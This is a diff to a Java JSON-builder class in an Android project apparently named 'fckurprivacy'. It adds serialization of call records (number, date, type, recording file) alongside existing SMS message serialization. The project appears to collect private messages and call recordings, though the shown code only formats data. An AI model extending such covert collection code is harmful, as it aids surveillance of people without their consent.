@@ -1,5 +1,7 @@
 package com.vergermiya.harevost.fckurprivacy.Util;
 
+import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecord;
+import com.vergermiya.harevost.fckurprivacy.CallRecorder.CallRecordJSon;
 import com.vergermiya.harevost.fckurprivacy.InfoChecker.InfoJson;
 import com.vergermiya.harevost.fckurprivacy.SmsChecker.SmsJson;
 
@@ -62,25 +64,39 @@ public class JsonBuilder {
     public static JSONArray buildSmsJsons(ArrayList<SmsJson> smsJsons) {
         JSONArray jsonArray = new JSONArray();
         for (SmsJson smsJson : smsJsons) {
-            JSONStringer jsonText = new JSONStringer();
-            try {
-                jsonText.object();
+            JSONStringer jsonText = buildSmsJson(smsJson);
+            jsonArray.put(jsonText);
+        }
+        return jsonArray;
+    }
 
-                jsonText.key("PhoneNumber").value(smsJson.getPhoneNumber());
-                jsonText.key("ThreadId").value(smsJson.getThreadId());
-                jsonText.key("Date").value(smsJson.getDate());
-                jsonText.key("Type").value(smsJson.getType());
-                jsonText.key("Body").value(smsJson.getBody());
+    public static JSONStringer buildCallRecordJson(CallRecordJSon callRecordJSon) {
+        JSONStringer jsonText = new JSONStringer();
+        try {
+            jsonText.object();
 
-                jsonText.endObject();
-            } catch (JSONException e) {
-                e.printStackTrace();
-            }
+            jsonText.key("PhoneNumber").value(callRecordJSon.getPhoneNumber());
+            jsonText.key("Date").value(callRecordJSon.getCallDate());
+            jsonText.key("Type").value(callRecordJSon.getCallType());
+            jsonText.key("File").value(callRecordJSon.getCallFile());
+
+            jsonText.endObject();
+        } catch (JSONException e) {
+            e.printStackTrace();
+        }
+        return jsonText;
+    }
+
+    public static JSONArray buildCallRecordJsons(ArrayList<CallRecordJSon> callRecordJSons) {
+        JSONArray jsonArray = new JSONArray();
+        for (CallRecordJSon callRecordJSon : callRecordJSons) {
+            JSONStringer jsonText = buildCallRecordJson(callRecordJSon);
             jsonArray.put(jsonText);
         }
         return jsonArray;
     }
 }
+
 
 
 
